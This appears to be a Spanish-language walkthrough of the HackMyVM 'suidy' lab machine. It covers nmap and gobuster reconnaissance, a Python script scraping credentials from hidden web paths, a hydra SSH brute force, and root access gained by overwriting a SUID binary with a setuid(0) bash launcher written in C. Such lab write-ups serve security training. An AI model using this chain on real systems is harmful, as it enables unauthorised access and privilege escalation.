+++
title = 'suidy - HackMyVM (Easy)'
+++

## Descubrimiento de máquina objetivo en la red con nmap

```bash
nmap -sn 10.38.1.0/24
```

![nmap host discovery](/images/writeups/hackmyvm/suidy/nmaphd.png)

### La IP de la máquina objetivo es **10.38.1.34**

## Escaneo de puertos en la máquina objetivo con nmap

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.38.1.34 -oN target_scan.nmap
```

```bash
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: target_scan.nmap
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # Nmap 7.94SVN scan initiated Thu Jul 18 10:48:40 2024 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oN t
       │ arget_scan.nmap 10.38.1.34
   2   │ Nmap scan report for 10.38.1.34
   3   │ Host is up, received arp-response (0.00013s latency).
   4   │ Scanned at 2024-07-18 10:48:41 EDT for 2s
   5   │ Not shown: 65533 closed tcp ports (reset)
   6   │ PORT   STATE SERVICE REASON
   7   │ 22/tcp open  ssh     syn-ack ttl 64
   8   │ 80/tcp open  http    syn-ack ttl 64
   9   │ MAC Address: 08:00:27:88:3D:F4 (Oracle VirtualBox virtual NIC)
  10   │ 
  11   │ Read data files from: /usr/bin/../share/nmap
  12   │ # Nmap done at Thu Jul 18 10:48:43 2024 -- 1 IP address (1 host up) scanned in 2.40 seconds
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

### **Puertos Abiertos: 22,80**

## Enumeración de directorios con gobuster

```bash
kali :: Documents/hackmyvm/suidy » gobuster dir -u http://10.38.1.34/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,zip,txt
```

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.38.1.34/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,zip,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 22]
/robots.txt           (Status: 200) [Size: 362]
Progress: 1102795 / 1102800 (100.00%)
===============================================================
Finished
===============================================================
```

## Contenido del archivo robots.txt

![nmap host discovery](/images/writeups/hackmyvm/suidy/robotstxt.png)

![nmap host discovery](/images/writeups/hackmyvm/suidy/robotstxtend.png)

![nmap host discovery](/images/writeups/hackmyvm/suidy/shehatesme.png)


## Script en python para obtener credenciales y eliminar las duplicadas 

*Rutas encontradas con gobuster y guardadas en el archivo **files.txt***

```py
import requests

def get_files_content():
    with open("files.txt", 'r') as routes:
        for route in routes:
            url = f"http://10.38.1.34/shehatesme{route.strip()}"
            response = requests.get(url)
            print(response.text)
            with open("credentials.txt", 'a') as creds:
                creds.write(response.text)

def delete_duplicates_creds():
    creds_seen = set() # holds lines already seen
    with open("credentials.txt", 'r') as creds:
        for cred in creds:
            with open("credentials_clean.txt", 'a') as creds_clean:
                if cred not in creds_seen: # not a duplicate
                    creds_clean.write(cred)
                    creds_seen.add(cred)
    
get_files_content()
delete_duplicates_creds()
```

## Credenciales encontradas

```bash
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: credentials_clean.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ yuijhse/hjupnkk
   2   │ jaime11/JKiufg6
   3   │ hidden1/passZZ!
   4   │ jhfbvgt/iugbnvh
   5   │ john765/FDrhguy
   6   │ maria11/jhfgyRf
   7   │ mmnnbbv/iughtyr
   8   │ smileys/98GHbjh
   9   │ nhvjguy/kjhgyut
  10   │ theuser/thepass
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

## Brute Force ssh con hydra

```bash
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: usernames.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ yuijhse
   2   │ jaime11
   3   │ hidden1
   4   │ jhfbvgt
   5   │ john765
   6   │ maria11
   7   │ mmnnbbv
   8   │ smileys
   9   │ nhvjguy
  10   │ theuser
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: passwords.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ hjupnkk
   2   │ JKiufg6
   3   │ passZZ!
   4   │ iugbnvh
   5   │ FDrhguy
   6   │ jhfgyRf
   7   │ iughtyr
   8   │ 98GHbjh
   9   │ kjhgyut
  10   │ thepass
───────┴─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

```bash
kali :: Documents/hackmyvm/suidy » sudo hydra -L usernames.txt -P passwords.txt ssh://10.38.1.34  
[sudo] password for fafi: 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-18 12:00:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:10/p:10), ~7 tries per task
[DATA] attacking ssh://10.38.1.34:22/
[22][ssh] host: 10.38.1.34   login: theuser   password: thepass
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-18 12:00:52
```
### Credenciales

`theuser:thepass`

## Flag de usuario theuser

```bash

kali :: Documents/hackmyvm/suidy » ssh theuser@10.38.1.34 

theuser@10.38.1.34's password: thepass
Linux suidy 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Sep 27 00:41:28 2020
theuser@suidy:~$ ls
user.txt
theuser@suidy:~$ cat user.txt 
HMV23*****
```

## Binario encontrado en /home/suidy

```bash
theuser@suidy:/home/suidy$ ls
note.txt  suidyyyyy
```

*Al ejecutarlo cambia el usuario a suidy y nos permite leer el archivo note.txt* 

## Contenido de note.txt 

```bash
suidy@suidy:/home/suidy$ cat note.txt 
I love SUID files!
The best file is suidyyyyy because users can use it to feel as I feel.
root know it and run an script to be sure that my file has SUID. 
If you are "theuser" I hate you!

-suidy
```

## Modificación del archivo suidyyyyy y obtención de flag del usuario root 


### Código en C para ejecutar una bash como root 

```c
#include <stdio.h>

int main() {


   //use the system fucntion to execute the command.
   setuid(0);
   system("/bin/bash -p");

   return 0;
}
```

```bash

theuser@suidy:~$ gcc exec.c -o exec


theuser@suidy:/home/suidy$ cp ../theuser/exec suidyyyyy


theuser@suidy:/home/suidy$ ls
note.txt  pspy64  suidyyyyy

theuser@suidy:/home/suidy$ ./suidyyyyy

 
root@suidy:/home/suidy# whoami
root


root@suidy:/# cd root/

root@suidy:/root# ls
root.txt  timer.sh

root@suidy:/root# cat root.txt 
HMV00*****
```


